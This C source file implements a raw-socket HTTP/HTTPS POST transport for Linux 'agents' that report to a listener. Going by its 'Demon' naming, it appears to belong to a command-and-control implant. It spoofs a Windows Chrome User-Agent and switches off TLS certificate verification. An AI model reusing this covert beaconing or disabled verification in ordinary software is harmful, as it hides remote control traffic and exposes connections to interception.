/*
 * TransportSocket.c — Raw-socket HTTP/HTTPS transport for cross-compiled
 *                     Linux agents (compiled with zig cc + musl).
 *
 * Used when TRANSPORT_RAW_SOCKET is defined at compile time.
 * Does NOT depend on libcurl, uses only:
 *   - POSIX sockets (always available)
 *   - OpenSSL for TLS
 *     OR plain TCP for non-SSL listeners.
 *
 * For SSL: peer certificate verification is disabled (self-signed cert).
 * For non-SSL: plain TCP.
 *
 * The public API is identical to Transport.c so only one gets compiled.
 */

#ifdef TRANSPORT_RAW_SOCKET

#include "DemonPosix.h"
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <errno.h>

#ifdef CONFIG_SSL
#  if CONFIG_SSL
#    define USE_TLS 1
#  else
#    define USE_TLS 0
#  endif
#else
#  define USE_TLS 0
#endif

#ifndef CONFIG_USERAGENT
#  define CONFIG_USERAGENT "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
#endif

/* ── Response buffer ─────────────────────────────────────────────────── */
typedef struct {
    uint8_t *data;
    size_t   size;
    size_t   cap;
} RawBuf;

static void rawbuf_append(RawBuf *b, const uint8_t *chunk, size_t n)
{
    if (b->size + n > b->cap) {
        b->cap = (b->size + n) * 2 + 4096;
        b->data = (uint8_t *)realloc(b->data, b->cap);
    }
    memcpy(b->data + b->size, chunk, n);
    b->size += n;
}

/* ── TCP connect ──────────────────────────────────────────────────────── */
static int tcp_connect(const char *host, uint16_t port)
{
    struct addrinfo hints, *res, *rp;
    char port_str[8];
    int fd = -1;

    memset(&hints, 0, sizeof(hints));
    hints.ai_family   = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    snprintf(port_str, sizeof(port_str), "%u", port);
    if (getaddrinfo(host, port_str, &hints, &res) != 0)
        return -1;

    for (rp = res; rp; rp = rp->ai_next) {
        fd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
        if (fd < 0) continue;
        if (connect(fd, rp->ai_addr, rp->ai_addrlen) == 0)
            break;
        close(fd);
        fd = -1;
    }
    freeaddrinfo(res);
    return fd;
}

/* ── HTTP/1.1 POST over plain TCP ────────────────────────────────────── */
static int http_post_plain(const char *host, uint16_t port, const char *uri,
                            const uint8_t *body, size_t body_len,
                            RawBuf *resp)
{
    int fd = tcp_connect(host, port);
    if (fd < 0) return -1;

    char hdr[2048];
    int hdr_len = snprintf(hdr, sizeof(hdr),
        "POST %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Content-Type: application/octet-stream\r\n"
        "Content-Length: %zu\r\n"
        "Connection: close\r\n"
        "\r\n",
        uri, host, CONFIG_USERAGENT, body_len);

    if (send(fd, hdr, (size_t)hdr_len, 0) < 0 ||
        send(fd, body, body_len, 0) < 0) {
        close(fd);
        return -1;
    }

    uint8_t tmp[4096];
    ssize_t n;
    RawBuf full = {0};
    while ((n = recv(fd, tmp, sizeof(tmp), 0)) > 0)
        rawbuf_append(&full, tmp, (size_t)n);
    close(fd);

    if (!full.data || full.size < 12) { free(full.data); return -1; }

    char status[4] = {0};
    if (full.size >= 12)
        memcpy(status, full.data + 9, 3);
    if (status[0] != '2') { free(full.data); return -1; }

    uint8_t sep[] = {'\r', '\n', '\r', '\n'};
    uint8_t *body_start = NULL;
    for (size_t i = 0; i + 4 <= full.size; i++) {
        if (memcmp(full.data + i, sep, 4) == 0) {
            body_start = full.data + i + 4;
            break;
        }
    }

    if (!body_start) { free(full.data); return -1; }

    size_t blen = full.size - (size_t)(body_start - full.data);
    resp->data = (uint8_t *)malloc(blen);
    resp->size = blen;
    memcpy(resp->data, body_start, blen);
    free(full.data);
    return 0;
}

/* ── TLS (OpenSSL) POST ───────────────────────────────────────────────── */
#if USE_TLS

#include <openssl/ssl.h>
#include <openssl/err.h>

static int https_post_openssl(const char *host, uint16_t port, const char *uri,
                               const uint8_t *body, size_t body_len,
                               RawBuf *resp)
{
    int fd = tcp_connect(host, port);
    if (fd < 0) return -1;

    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) { close(fd); return -1; }

    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);
    SSL_CTX_set_options(ctx, SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3);

    SSL *ssl = SSL_new(ctx);
    if (!ssl) { SSL_CTX_free(ctx); close(fd); return -1; }

    SSL_set_fd(ssl, fd);
    SSL_set_tlsext_host_name(ssl, host);

    if (SSL_connect(ssl) != 1) {
        SSL_free(ssl);
        SSL_CTX_free(ctx);
        close(fd);
        return -1;
    }

    char hdr[2048];
    int hdr_len = snprintf(hdr, sizeof(hdr),
        "POST %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Content-Type: application/octet-stream\r\n"
        "Content-Length: %zu\r\n"
        "Connection: close\r\n"
        "\r\n",
        uri, host, CONFIG_USERAGENT, body_len);

    if (SSL_write(ssl, hdr, hdr_len) <= 0 ||
        SSL_write(ssl, body, (int)body_len) <= 0) {
        SSL_free(ssl);
        SSL_CTX_free(ctx);
        close(fd);
        return -1;
    }

    RawBuf full = {0};
    uint8_t tmp[4096];
    int n;
    while ((n = SSL_read(ssl, tmp, sizeof(tmp))) > 0)
        rawbuf_append(&full, tmp, (size_t)n);

    SSL_free(ssl);
    SSL_CTX_free(ctx);
    close(fd);

    if (!full.data || full.size < 12) { free(full.data); return -1; }

    char status[4] = {0};
    memcpy(status, full.data + 9, 3);
    if (status[0] != '2') { free(full.data); return -1; }

    uint8_t sep[] = {'\r', '\n', '\r', '\n'};
    uint8_t *body_start = NULL;
    for (size_t i = 0; i + 4 <= full.size; i++) {
        if (memcmp(full.data + i, sep, 4) == 0) {
            body_start = full.data + i + 4;
            break;
        }
    }
    if (!body_start) { free(full.data); return -1; }

    size_t blen = full.size - (size_t)(body_start - full.data);
    resp->data = (uint8_t *)malloc(blen);
    resp->size = blen;
    memcpy(resp->data, body_start, blen);
    free(full.data);
    return 0;
}

#endif /* USE_TLS */

/* ── Public API ──────────────────────────────────────────────────────── */
int TransportHttpInit(void)  { return 0; }
void TransportHttpCleanup(void) {}

int TransportSendRecv(const uint8_t *request,  size_t   req_len,
                      uint8_t      **response,  size_t  *resp_len)
{
    if (!request || !response || !resp_len || !DemonInstance) return -1;

    HTTP_CONFIG *h = &DemonInstance->Transport.Http;
    RawBuf resp   = {0};
    int rc;

#if USE_TLS
    rc = https_post_openssl(h->Host, h->Port,
                             h->Uri ? h->Uri : "/",
                             request, req_len, &resp);
#else
    rc = http_post_plain(h->Host, h->Port,
                          h->Uri ? h->Uri : "/",
                          request, req_len, &resp);
#endif

    if (rc != 0) return -1;

    *response = resp.data;
    *resp_len = resp.size;
    return 0;
}

#endif /* TRANSPORT_RAW_SOCKET */
